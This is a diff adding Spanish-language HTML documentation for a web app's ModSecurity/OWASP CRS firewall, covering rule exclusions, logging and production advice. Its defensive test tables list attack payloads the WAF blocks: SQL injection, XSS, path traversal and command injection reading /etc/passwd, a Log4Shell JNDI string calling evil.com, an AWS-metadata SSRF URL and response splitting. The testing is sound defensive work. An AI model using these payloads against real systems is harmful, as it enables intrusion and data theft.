+</pre></div>
+</div>
+<p>No se inspeccionan los cuerpos de las respuestas. Esto evita que el WAF analice (y potencialmente bloquee) las respuestas JSON de la API, y previene fugas de información sobre las reglas internas del WAF.</p>
+</section>
+</section>
+<hr class="docutils" />
+<section id="ataques-bloqueados-bateria-de-pruebas-verificada">
+<h2>Ataques bloqueados (batería de pruebas verificada)<a class="headerlink" href="#ataques-bloqueados-bateria-de-pruebas-verificada" title="Link to this heading">¶</a></h2>
+<p>Se ha ejecutado una batería de 15 pruebas automatizadas contra el WAF. Todas las categorías de ataque son bloqueadas correctamente:</p>
+<section id="inyeccion-sql">
+<h3>Inyección SQL<a class="headerlink" href="#inyeccion-sql" title="Link to this heading">¶</a></h3>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Payload</p></th>
+<th class="head"><p>Vector</p></th>
+<th class="head"><p>HTTP</p></th>
+<th class="head"><p>Estado</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">?id=1</span> <span class="pre">OR</span> <span class="pre">1=1</span></code></p></td>
+<td><p>Query string</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">?q=1</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">username,password</span> <span class="pre">FROM</span> <span class="pre">users</span></code></p></td>
+<td><p>Query string</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">{&quot;username&quot;:&quot;admin'</span> <span class="pre">OR</span> <span class="pre">1=1--&quot;,&quot;password&quot;:&quot;x&quot;}</span></code></p></td>
+<td><p>JSON POST</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+<section id="cross-site-scripting-xss">
+<h3>Cross-Site Scripting (XSS)<a class="headerlink" href="#cross-site-scripting-xss" title="Link to this heading">¶</a></h3>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Payload</p></th>
+<th class="head"><p>Vector</p></th>
+<th class="head"><p>HTTP</p></th>
+<th class="head"><p>Estado</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(1)&lt;/script&gt;</span></code></p></td>
+<td><p>Query string</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=x</span> <span class="pre">onerror=alert(1)&gt;</span></code></p></td>
+<td><p>Query string</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">&lt;svg</span> <span class="pre">onload=alert(1)&gt;</span></code></p></td>
+<td><p>Query string</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+<section id="path-traversal-inclusion-de-ficheros">
+<h3>Path Traversal / Inclusión de ficheros<a class="headerlink" href="#path-traversal-inclusion-de-ficheros" title="Link to this heading">¶</a></h3>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Payload</p></th>
+<th class="head"><p>Vector</p></th>
+<th class="head"><p>HTTP</p></th>
+<th class="head"><p>Estado</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/..%2f..%2f..%2fetc%2fpasswd</span></code></p></td>
+<td><p>URL path</p></td>
+<td><p>400</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+<section id="inyeccion-de-comandos-del-sistema">
+<h3>Inyección de comandos del sistema<a class="headerlink" href="#inyeccion-de-comandos-del-sistema" title="Link to this heading">¶</a></h3>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Payload</p></th>
+<th class="head"><p>Vector</p></th>
+<th class="head"><p>HTTP</p></th>
+<th class="head"><p>Estado</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">?cmd=;cat</span> <span class="pre">/etc/passwd</span></code></p></td>
+<td><p>Query string</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">?x=|ls</span> <span class="pre">-la</span></code></p></td>
+<td><p>Query string</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+<section id="ataques-de-protocolo-aplicacion">
+<h3>Ataques de protocolo / aplicación<a class="headerlink" href="#ataques-de-protocolo-aplicacion" title="Link to this heading">¶</a></h3>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Payload</p></th>
+<th class="head"><p>Vector</p></th>
+<th class="head"><p>HTTP</p></th>
+<th class="head"><p>Estado</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p>Header <code class="docutils literal notranslate"><span class="pre">${jndi:ldap://evil.com/x}</span></code></p></td>
+<td><p>Cabecera (Log4Shell)</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">?url=http://169.254.169.254/latest/meta-data/</span></code></p></td>
+<td><p>SSRF (metadata AWS)</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">%0d%0aSet-Cookie:</span> <span class="pre">evil=1</span></code></p></td>
+<td><p>HTTP Response Splitting</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+<section id="deteccion-de-scanners-y-bots">
+<h3>Detección de scanners y bots<a class="headerlink" href="#deteccion-de-scanners-y-bots" title="Link to this heading">¶</a></h3>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Payload</p></th>
+<th class="head"><p>Vector</p></th>
+<th class="head"><p>HTTP</p></th>
+<th class="head"><p>Estado</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">User-Agent:</span> <span class="pre">Nikto</span></code></p></td>
+<td><p>Cabecera</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">User-Agent:</span> <span class="pre">sqlmap/1.5</span></code></p></td>
+<td><p>Cabecera</p></td>
+<td><p>403</p></td>
+<td><p>Bloqueado</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+<section id="fugas-de-informacion">
+<h3>Fugas de información<a class="headerlink" href="#fugas-de-informacion" title="Link to this heading">¶</a></h3>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Verificación</p></th>
+<th class="head"><p>Resultado</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p>La respuesta 403 no revela nombre/versión del WAF, servidor ni motor de reglas</p></td>
+<td><p>Sin fugas</p></td>
+</tr>
+<tr class="row-odd"><td><p>Header <code class="docutils literal notranslate"><span class="pre">Server:</span></code> muestra <code class="docutils literal notranslate"><span class="pre">nginx</span></code> sin número de versión</p></td>
+<td><p>Sin fugas</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+</section>
+<hr class="docutils" />
+<section id="pruebas-de-integridad-funcionalidad-no-afectada">
+<h2>Pruebas de integridad (funcionalidad no afectada)<a class="headerlink" href="#pruebas-de-integridad-funcionalidad-no-afectada" title="Link to this heading">¶</a></h2>
+<p>Verificado que el WAF <strong>no bloquea</strong> el tráfico legítimo de la aplicación:</p>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Endpoint</p></th>
+<th class="head"><p>Método</p></th>
+<th class="head"><p>Resultado</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/</span></code></p></td>
+<td><p>GET</p></td>
+<td><p>200 — Página principal cargada</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/api/config</span></code></p></td>
+<td><p>GET</p></td>
+<td><p>200 — JSON con <code class="docutils literal notranslate"><span class="pre">validation_limits</span></code></p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/api/auth/register</span></code></p></td>
+<td><p>POST (JSON)</p></td>
+<td><p>Funcional (pasa a través del WAF)</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/api/auth/login</span></code></p></td>
+<td><p>POST (JSON)</p></td>
+<td><p>Funcional (pasa a través del WAF)</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/api/user</span></code></p></td>
+<td><p>POST (JSON + CSRF)</p></td>
+<td><p>Funcional</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/api/auth/me</span></code></p></td>
+<td><p>GET (con sesión)</p></td>
+<td><p>Funcional</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/api/auth/logout</span></code></p></td>
+<td><p>POST (con CSRF)</p></td>
+<td><p>Funcional</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/static/css/style.css</span></code></p></td>
+<td><p>GET</p></td>
+<td><p>200 — Recursos estáticos servidos</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/static/js/main.js</span></code></p></td>
+<td><p>GET</p></td>
+<td><p>200 — JavaScript servido</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/static/js/auth.js</span></code></p></td>
+<td><p>GET</p></td>
+<td><p>200 — JavaScript servido</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>213 tests backend</strong> ejecutados dentro del contenedor: todos pasan.</p>
+</section>
+<hr class="docutils" />
+<section id="logging-y-monitorizacion">
+<h2>Logging y monitorización<a class="headerlink" href="#logging-y-monitorizacion" title="Link to this heading">¶</a></h2>
+<section id="ver-logs-en-tiempo-real">
+<h3>Ver logs en tiempo real<a class="headerlink" href="#ver-logs-en-tiempo-real" title="Link to this heading">¶</a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>make<span class="w"> </span>logs-waf
+</pre></div>
+</div>
+</section>
+<section id="ficheros-de-log">
+<h3>Ficheros de log<a class="headerlink" href="#ficheros-de-log" title="Link to this heading">¶</a></h3>
+<p>Los logs de ModSecurity se persisten en el host en <code class="docutils literal notranslate"><span class="pre">data/waf/</span></code> (volumen montado en <code class="docutils literal notranslate"><span class="pre">/var/log/modsecurity</span></code> del contenedor).</p>
+</section>
+<section id="que-se-registra">
+<h3>Qué se registra<a class="headerlink" href="#que-se-registra" title="Link to this heading">¶</a></h3>
+<ul class="simple">
+<li><p>Peticiones bloqueadas (regla activada, score, payload, IP origen).</p></li>
+<li><p>Peticiones permitidas que activaron reglas pero no alcanzaron el umbral de anomalía.</p></li>
+<li><p>Errores internos del WAF.</p></li>
+</ul>
+</section>
+<section id="ejemplo-de-entrada-de-log-ataque-bloqueado">
+<h3>Ejemplo de entrada de log (ataque bloqueado)<a class="headerlink" href="#ejemplo-de-entrada-de-log-ataque-bloqueado" title="Link to this heading">¶</a></h3>
+<p>Cuando una petición es bloqueada, el log incluye:</p>
+<ul class="simple">
+<li><p><strong>ID de regla</strong> que se activó (ej. <code class="docutils literal notranslate"><span class="pre">941100</span></code> para XSS, <code class="docutils literal notranslate"><span class="pre">942100</span></code> para SQLi).</p></li>
+<li><p><strong>URI</strong> de la petición.</p></li>
+<li><p><strong>Datos del match</strong> (el fragmento del payload que activó la regla).</p></li>
+<li><p><strong>Puntuación de anomalía</strong> acumulada.</p></li>
+<li><p><strong>Acción</strong> tomada (<code class="docutils literal notranslate"><span class="pre">deny</span></code>, <code class="docutils literal notranslate"><span class="pre">pass</span></code>).</p></li>
+</ul>
+</section>
+</section>
+<hr class="docutils" />
+<section id="ficheros-del-waf-en-el-proyecto">
+<h2>Ficheros del WAF en el proyecto<a class="headerlink" href="#ficheros-del-waf-en-el-proyecto" title="Link to this heading">¶</a></h2>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Fichero / Directorio</p></th>
+<th class="head"><p>Función</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">docker-compose.yml</span></code> → servicio <code class="docutils literal notranslate"><span class="pre">waf</span></code></p></td>
+<td><p>Definición del contenedor WAF, variables de entorno, volumes, healthcheck</p></td>
+</tr>
+<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">waf/modsecurity-override.conf</span></code></p></td>
+<td><p>Exclusiones de reglas (falsos positivos) específicas de la aplicación</p></td>
+</tr>
+<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">data/waf/</span></code></p></td>
+<td><p>Logs persistentes de ModSecurity (montado como volumen, ignorado por <code class="docutils literal notranslate"><span class="pre">.gitignore</span></code>)</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+<hr class="docutils" />
+<section id="personalizacion">
+<h2>Personalización<a class="headerlink" href="#personalizacion" title="Link to this heading">¶</a></h2>
+<section id="cambiar-a-modo-deteccion-sin-bloqueo">
+<h3>Cambiar a modo detección (sin bloqueo)<a class="headerlink" href="#cambiar-a-modo-deteccion-sin-bloqueo" title="Link to this heading">¶</a></h3>
+<p>Para probar el WAF sin bloquear peticiones (solo registra en log):</p>
+<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="c1"># docker-compose.yml → servicio waf → environment</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">MODSEC_RULE_ENGINE=DetectionOnly</span>
+</pre></div>
+</div>
+</section>
+<section id="subir-el-paranoia-level">
+<h3>Subir el Paranoia Level<a class="headerlink" href="#subir-el-paranoia-level" title="Link to this heading">¶</a></h3>
+<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">PARANOIA=2</span><span class="w">  </span><span class="c1"># o 3 o 4</span>
+</pre></div>
+</div>
+<blockquote>
+<div><p>Al subir el PL, es probable que aparezcan nuevos falsos positivos. Revisar los logs (<code class="docutils literal notranslate"><span class="pre">make</span> <span class="pre">logs-waf</span></code>), identificar las reglas que se activan con tráfico legítimo y añadir exclusiones en <code class="docutils literal notranslate"><span class="pre">waf/modsecurity-override.conf</span></code>.</p>
+</div></blockquote>
+</section>
+<section id="anadir-una-nueva-exclusion">
+<h3>Añadir una nueva exclusión<a class="headerlink" href="#anadir-una-nueva-exclusion" title="Link to this heading">¶</a></h3>
+<p>Formato general para excluir un campo específico de una regla en una ruta concreta:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SecRule</span> <span class="n">REQUEST_URI</span> <span class="s2">&quot;@beginsWith /api/mi-ruta&quot;</span> \
+    <span class="s2">&quot;id:10005,</span><span class="se">\</span>
+<span class="s2">    phase:1,</span><span class="se">\</span>
+<span class="s2">    pass,</span><span class="se">\</span>
+<span class="s2">    nolog,</span><span class="se">\</span>
+<span class="s2">    ctl:ruleRemoveTargetById=REGLA_ID;ARGS:nombre_campo&quot;</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>El <code class="docutils literal notranslate"><span class="pre">id</span></code> debe ser único (usar rango 10000+).</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">phase:1</span></code> = se aplica en la fase de cabeceras/petición.</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">ctl:ruleRemoveTargetById</span></code> desactiva una regla específica solo para ese campo.</p></li>
+</ul>
+</section>
+</section>
+<hr class="docutils" />
+<section id="consideraciones-de-produccion">
+<h2>Consideraciones de producción<a class="headerlink" href="#consideraciones-de-produccion" title="Link to this heading">¶</a></h2>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Aspecto</p></th>
+<th class="head"><p>Recomendación</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><strong>Supervisor</strong></p></td>
+<td><p>Desactivar (<code class="docutils literal notranslate"><span class="pre">APP_SUPERVISOR=0</span></code>). La regla 10004 que desactiva el WAF para <code class="docutils literal notranslate"><span class="pre">/supervisor</span></code> no debería existir en producción.</p></td>
+</tr>
+<tr class="row-odd"><td><p><strong>HTTPS</strong></p></td>
+<td><p>En producción, colocar un terminador TLS (Nginx, Traefik, Cloudflare) delante del WAF o configurar certificados en el propio contenedor WAF.</p></td>
+</tr>
+<tr class="row-even"><td><p><strong>Logs</strong></p></td>
+<td><p>Rotar los logs de <code class="docutils literal notranslate"><span class="pre">data/waf/</span></code> con logrotate o similar para evitar que crezcan indefinidamente.</p></td>
+</tr>
+<tr class="row-odd"><td><p><strong>Paranoia Level</strong></p></td>
+<td><p>Evaluar si PL 2 es viable tras un período de observación con <code class="docutils literal notranslate"><span class="pre">DetectionOnly</span></code>.</p></td>
+</tr>
+<tr class="row-even"><td><p><strong>Actualizaciones</strong></p></td>
+<td><p>La imagen <code class="docutils literal notranslate"><span class="pre">owasp/modsecurity-crs:nginx-alpine</span></code> se actualiza periódicamente con nuevas reglas. Ejecutar <code class="docutils literal notranslate"><span class="pre">docker</span> <span class="pre">pull</span> <span class="pre">owasp/modsecurity-crs:nginx-alpine</span></code> y reiniciar.</p></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+<hr class="docutils" />
+<section id="relacion-con-otras-medidas-de-seguridad">
+<h2>Relación con otras medidas de seguridad<a class="headerlink" href="#relacion-con-otras-medidas-de-seguridad" title="Link to this heading">¶</a></h2>
+<p>El WAF complementa (no sustituye) las demás capas de seguridad de la aplicación:</p>
+<div class="table-wrapper colwidths-auto docutils container">
+<table class="docutils align-default">
+<thead>
+<tr class="row-odd"><th class="head"><p>Capa</p></th>
+<th class="head"><p>Medida</p></th>
+<th class="head"><p>Documentación</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p>Entrada</p></td>
+<td><p>Validación y sanitización de datos</p></td>
+<td><p><a class="reference internal" href="01-validacion-entradas.html"><span class="std std-doc">01. Validación de entradas</span></a></p></td>
+</tr>
+<tr class="row-odd"><td><p>Autenticación</p></td>
+<td><p>Argon2id, HIBP, reCAPTCHA v3</p></td>
+<td><p><a class="reference internal" href="02-autenticacion-contrasenas.html"><span class="std std-doc">02. Autenticación y contraseñas</span></a></p></td>
+</tr>
+<tr class="row-even"><td><p>Sesión</p></td>
+<td><p>Cookies HttpOnly, SameSite, CSRF tokens</p></td>
+<td><p><a class="reference internal" href="03-sesiones-csrf.html"><span class="std std-doc">03. Sesiones y CSRF</span></a></p></td>
+</tr>
+<tr class="row-odd"><td><p>Transporte</p></td>
+<td><p>Headers de seguridad, HSTS, SQLCipher</p></td>
+<td><p><a class="reference internal" href="04-headers-https.html"><span class="std std-doc">04. Headers y HTTPS</span></a></p></td>
+</tr>
+<tr class="row-even"><td><p>Aplicación</p></td>
+<td><p>Rate limiting (Flask-Limiter)</p></td>
+<td><p><a class="reference internal" href="05-rate-limiting-y-config.html"><span class="std std-doc">05. Rate limiting y configuración</span></a></p></td>
+</tr>
+<tr class="row-odd"><td><p><strong>Perímetro</strong></p></td>
+<td><p><strong>WAF: ModSecurity + OWASP CRS</strong></p></td>
+<td><p><strong>Este documento</strong></p></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><a class="reference internal" href="../SEGURIDAD.html"><span class="std std-doc">← Índice de seguridad</span></a></p>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          
+          
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2025, PumukyDev &amp; Alejandro Quiñones
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">WAF: ModSecurity v3 + OWASP Core Rule Set (CRS)</a><ul>
+<li><a class="reference internal" href="#que-es-y-por-que-se-usa">Qué es y por qué se usa</a><ul>
+<li><a class="reference internal" href="#que-aporta-a-la-aplicacion">Qué aporta a la aplicación</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#arquitectura">Arquitectura</a></li>
+<li><a class="reference internal" href="#configuracion">Configuración</a><ul>
+<li><a class="reference internal" href="#paranoia-level-pl">Paranoia Level (PL)</a></li>
+<li><a class="reference internal" href="#anomaly-scoring">Anomaly Scoring</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#exclusiones-para-falsos-positivos">Exclusiones para falsos positivos</a><ul>
+<li><a class="reference internal" href="#regla-10001-campo-password-en-rutas-de-autenticacion">Regla 10001 — Campo <code class="docutils literal notranslate"><span class="pre">password</span></code> en rutas de autenticación</a></li>
+<li><a class="reference internal" href="#regla-10002-campo-recaptcha-token-en-rutas-de-autenticacion">Regla 10002 — Campo <code class="docutils literal notranslate"><span class="pre">recaptcha_token</span></code> en rutas de autenticación</a></li>
+<li><a class="reference internal" href="#regla-10003-campos-de-nombre-en-ruta-de-perfil">Regla 10003 — Campos de nombre en ruta de perfil</a></li>
+<li><a class="reference internal" href="#regla-10004-dashboard-supervisor-solo-desarrollo">Regla 10004 — Dashboard Supervisor (solo desarrollo)</a></li>
+<li><a class="reference internal" href="#secresponsebodyaccess-off">SecResponseBodyAccess Off</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#ataques-bloqueados-bateria-de-pruebas-verificada">Ataques bloqueados (batería de pruebas verificada)</a><ul>
+<li><a class="reference internal" href="#inyeccion-sql">Inyección SQL</a></li>
+<li><a class="reference internal" href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a></li>
+<li><a class="reference internal" href="#path-traversal-inclusion-de-ficheros">Path Traversal / Inclusión de ficheros</a></li>
+<li><a class="reference internal" href="#inyeccion-de-comandos-del-sistema">Inyección de comandos del sistema</a></li>
+<li><a class="reference internal" href="#ataques-de-protocolo-aplicacion">Ataques de protocolo / aplicación</a></li>
+<li><a class="reference internal" href="#deteccion-de-scanners-y-bots">Detección de scanners y bots</a></li>
+<li><a class="reference internal" href="#fugas-de-informacion">Fugas de información</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#pruebas-de-integridad-funcionalidad-no-afectada">Pruebas de integridad (funcionalidad no afectada)</a></li>
+<li><a class="reference internal" href="#logging-y-monitorizacion">Logging y monitorización</a><ul>
+<li><a class="reference internal" href="#ver-logs-en-tiempo-real">Ver logs en tiempo real</a></li>
+<li><a class="reference internal" href="#ficheros-de-log">Ficheros de log</a></li>
+<li><a class="reference internal" href="#que-se-registra">Qué se registra</a></li>
+<li><a class="reference internal" href="#ejemplo-de-entrada-de-log-ataque-bloqueado">Ejemplo de entrada de log (ataque bloqueado)</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#ficheros-del-waf-en-el-proyecto">Ficheros del WAF en el proyecto</a></li>
+<li><a class="reference internal" href="#personalizacion">Personalización</a><ul>
+<li><a class="reference internal" href="#cambiar-a-modo-deteccion-sin-bloqueo">Cambiar a modo detección (sin bloqueo)</a></li>
+<li><a class="reference internal" href="#subir-el-paranoia-level">Subir el Paranoia Level</a></li>
+<li><a class="reference internal" href="#anadir-una-nueva-exclusion">Añadir una nueva exclusión</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#consideraciones-de-produccion">Consideraciones de producción</a></li>
+<li><a class="reference internal" href="#relacion-con-otras-medidas-de-seguridad">Relación con otras medidas de seguridad</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script src="../_static/documentation_options.js?v=01f34227"></script>
+    <script src="../_static/doctools.js?v=9bcbadda"></script>
+    <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../_static/scripts/furo.js?v=46bd48cc"></script>
+    </body>
+</html>
